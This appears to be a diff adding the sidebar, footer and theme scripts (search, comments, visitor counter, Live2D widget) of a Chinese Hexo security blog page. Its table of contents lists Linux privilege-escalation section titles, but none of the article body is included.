+            <a href="/花式文件内容读取/" title="花式文件内容读取" target="_blank">花式文件内容读取</a>
+          </li>
+        
+          <li>
+            <a href="/Nodejs安全/" title="Nodejs安全" target="_blank">Nodejs安全</a>
+          </li>
+        
+      </ul>
+    </div>
+
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-信息收集"><span class="nav-number">2.</span> <span class="nav-text">0x01 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-提权方法"><span class="nav-number">3.</span> <span class="nav-text">0x02 提权方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-提权"><span class="nav-number">3.1.</span> <span class="nav-text">sudo  提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cronjobs-提权"><span class="nav-number">3.2.</span> <span class="nav-text">cronjobs 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID-提权"><span class="nav-number">3.3.</span> <span class="nav-text">SUID 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NFS-未授权"><span class="nav-number">3.4.</span> <span class="nav-text">NFS 未授权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker-组用户提权"><span class="nav-number">3.5.</span> <span class="nav-text">docker 组用户提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#systemd-配置提权"><span class="nav-number">3.6.</span> <span class="nav-text">systemd 配置提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考链接"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">boogle</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">全站总计字数&#58;</span>
+    
+    <span title="全站总计字数">57.3k</span>
+  
+</div>
+
+
+
+  <div class="powered-by">由 <a rel="external nofollow" class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '96DbJ7Tj8LDwhvF03Pcfymwl-gzGzoHsz',
+        appKey: 'DuUSj4dTajY34cjKfwsbgBJB',
+        placeholder: '如有不当，敬请指出 email:1473788702@qq.com',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("96DbJ7Tj8LDwhvF03Pcfymwl-gzGzoHsz", "DuUSj4dTajY34cjKfwsbgBJB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":90,"height":200},"mobile":{"show":true},"log":false});</script></body>
+</html>
